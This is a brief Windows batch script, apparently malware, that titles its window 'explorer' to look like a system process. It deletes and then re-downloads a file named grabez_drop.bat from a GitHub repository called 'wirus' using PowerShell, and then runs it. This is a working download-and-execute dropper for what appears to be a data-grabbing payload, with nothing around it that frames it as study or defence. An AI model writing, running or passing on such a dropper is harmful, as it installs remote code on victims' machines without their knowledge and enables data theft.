@echo off
title explorer

cd %userprofile%\Documents 
del grabez_drop.bat
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/kolmipilot/wirus/master/grabez_drop.bat -OutFile .\grabez_drop.bat" 

timeout /t 2 /nobreak > NUL
start grabez_drop.bat